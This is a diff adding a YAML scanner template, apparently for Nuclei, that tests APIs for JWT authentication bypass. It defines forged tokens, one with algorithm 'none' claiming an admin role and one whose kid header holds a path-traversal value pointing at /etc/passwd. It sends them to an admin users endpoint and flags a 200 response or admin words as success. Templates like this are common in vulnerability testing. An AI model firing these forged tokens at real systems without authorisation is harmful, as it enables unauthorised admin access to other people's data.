@@ -1,0 +1,51 @@
+id: jwt-auth-bypass
+
+info:
+  name: JWT Authentication Bypass
+  author: DAAKU
+  severity: critical
+  description: Tests JWT implementation for various bypass techniques
+  tags: jwt,auth-bypass,api
+
+variables:
+  normal_token: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJyb2xlIjoidXNlciJ9"
+  none_token: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwicm9sZSI6ImFkbWluIn0."
+  kid_token: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uL2V0Yy9wYXNzd2QifQ.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwicm9sZSI6ImFkbWluIn0"
+
+http:
+  - raw:
+      - |
+        GET /api/admin/users HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer {{normal_token}}
+        
+      - |
+        GET /api/admin/users HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer {{none_token}}
+        
+      - |
+        GET /api/admin/users HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer {{kid_token}}
+        
+      - |
+        GET /api/admin/users HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: token={{none_token}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "admin"
+          - "users"
+          - "dashboard"
+        condition: or
+        
+      - type: status
+        status:
+          - 200
+          - 201
+          - 204
